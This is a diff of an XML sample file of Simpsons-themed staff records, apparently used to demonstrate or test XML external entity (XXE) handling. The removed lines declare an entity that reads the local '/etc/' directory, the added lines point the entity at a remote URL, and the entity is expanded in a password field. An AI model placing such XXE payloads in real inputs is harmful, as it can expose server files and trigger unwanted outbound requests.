@@ -1,7 +1,10 @@
 <?xml version="1.0"?>
 <!DOCTYPE company [
-        <!ELEMENT foo ANY >
-        <!ENTITY xxe SYSTEM "file:///etc/" >
+        <!ELEMENT message (text)>
+        <!ATTLIST message font CDATA "Arial">
+        <!ELEMENT text (#PCDATA)>
+        <!ENTITY xxe SYSTEM
+                "https://www.smartjava.in.ua/java.txt">
         ]>
 <company>
     <staff id="1001">
@@ -10,26 +13,14 @@
         <nickname>nuclear</nickname>
         <salary>1</salary>
         <password>pass</password>
+        <about>About this person</about>
     </staff>
     <staff id="2001">
-        <firstname>Bart</firstname>
-        <lastname>Simpson</lastname>
-        <nickname>skate</nickname>
-        <salary>2</salary>
-        <password>pass</password>
-    </staff>
-    <staff id="3001">
-        <firstname>Lisa</firstname>
-        <lastname>Simpson</lastname>
-        <nickname>dummy</nickname>
-        <salary>2</salary>
-        <password>pass</password>
-    </staff>
-    <staff id="4001">
         <firstname>Maggie</firstname>
         <lastname>Simpson</lastname>
         <nickname>hairdo</nickname>
         <salary>2</salary>
         <password>&xxe;</password>
+        <about>About this person</about>
     </staff>
 </company>
